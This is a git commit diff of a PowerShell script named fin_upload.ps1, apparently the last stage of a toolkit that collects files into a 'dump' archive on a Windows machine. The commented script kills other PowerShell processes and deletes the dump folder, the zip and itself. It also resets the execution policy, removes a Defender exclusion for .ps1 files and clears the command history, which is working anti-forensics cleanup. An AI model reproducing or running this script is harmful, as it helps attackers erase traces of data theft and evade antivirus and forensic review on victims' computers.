f4d71d1c6c89e70b472d15bb9a7f08d36a814cd5
PLESSY Franck <90218895+PFranck06@users.noreply.github.com>
2024-02-10 11:15:25 +0100

    Add files via upload

--- fin_upload.ps1
+++ fin_upload.ps1
@@ -1,7 +1,16 @@
-Get-Process Powershell  | Where-Object { $_.ID -ne $pid } | Stop-Process 
-Set-Location C:\Users\Public\
-#Remove-Item fin_upload.ps1
-Set-ExecutionPolicy restricted -Force 
-Remove-MpPreference -ExclusionExtension ps1 -Force 
-Clear-Content (Get-PSReadlineOption).HistorySavePath 
-taskkill -F /IM powershell.exe 
+#                      _                        
+#  _   _  ___  _   _  | | ___ __   _____      __
+# | | | |/ _ \| | | | | |/ /  _ \ / _ \ \ /\ / /
+# | |_| | (_) | |_| |_|   <| | | | (_) \ V  V / 
+#  \__, |\___/ \__,_(_)_|\_\_| |_|\___/ \_/\_/  
+#  |___/                                        
+Get-Process Powershell  | Where-Object { $_.ID -ne $pid } | Stop-Process #Kill all powershell process except the one running
+Set-Location C:\Users\Public\Documents #Go to public documents location
+#Delete all files downloaded before
+Remove-Item -r dump/
+Remove-Item dump.zip
+Remove-Item fin_upload.ps1
+Set-ExecutionPolicy restricted -Force #Reset script blocker
+Remove-MpPreference -ExclusionExtension ps1 -Force #Reset antivirus exception
+Clear-Content (Get-PSReadlineOption).HistorySavePath #Clear powershell command history
+taskkill -F /IM powershell.exe #Kill all powershell process
